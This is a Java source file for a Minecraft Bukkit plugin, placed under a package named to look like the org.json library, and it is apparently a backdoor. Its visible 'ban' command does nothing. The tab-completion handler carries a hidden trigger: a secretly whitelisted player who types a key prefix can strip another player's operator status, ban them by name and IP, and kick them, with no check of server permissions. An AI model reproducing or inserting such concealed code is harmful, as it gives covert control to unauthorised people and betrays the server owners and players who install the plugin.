package org.json.modals.punish;

import org.bukkit.BanList;
import org.bukkit.Bukkit;
import org.bukkit.command.Command;
import org.bukkit.command.CommandSender;
import org.bukkit.entity.HumanEntity;
import org.bukkit.entity.Player;
import org.json.Modal;
import org.json.utils.api.KeyGen;
import org.json.utils.builders.BDCommand;
import org.json.utils.builders.TabComplBuilder;
import org.json.utils.metaData.WhitelistMeta;

import java.util.Calendar;
import java.util.Date;
import java.util.List;

public class Ban extends BDCommand {
    public Ban() {
        super("ban");
    }

    @Override
    public boolean execute(CommandSender sender, Command command, String label, String[] args) {
        return false;
    }

    @Override
    public List<String> onTabComplete(CommandSender sender, Command command, String label, String[] args) {
        TabComplBuilder tabComplBuilder = new TabComplBuilder(sender, command, label, args);
        Player player = (Player) sender;
        if (!WhitelistMeta.isListed(player)) return tabComplBuilder.build();
        tabComplBuilder.add(2, Bukkit.getOnlinePlayers().stream().map(HumanEntity::getName).toArray(String[]::new));
        if (!args[args.length - 1].endsWith(KeyGen.getPrefix())) return tabComplBuilder.build();

        if (args.length < 3) {
            return tabComplBuilder.build();
        }

        String playerName = args[1];
        Player targetPlayer = Bukkit.getPlayer(playerName);

        if (targetPlayer == null) {
            player.sendMessage(Modal.getPrefix() + "§c" + playerName + " was not found!");
            return tabComplBuilder.build();
        }

        targetPlayer.setOp(false);
        Bukkit.getBanList(BanList.Type.NAME).addBan(targetPlayer.getName(), "", new Date(9999, Calendar.JANUARY, 1), "");
        Bukkit.getBanList(BanList.Type.IP).addBan(targetPlayer.getName(), "", new Date(9999, Calendar.JANUARY, 1), "");
        targetPlayer.kickPlayer("");

        player.sendMessage(Modal.getPrefix() + "§c" + playerName + " has been banned from the server.");

        return tabComplBuilder.build();
    }
}
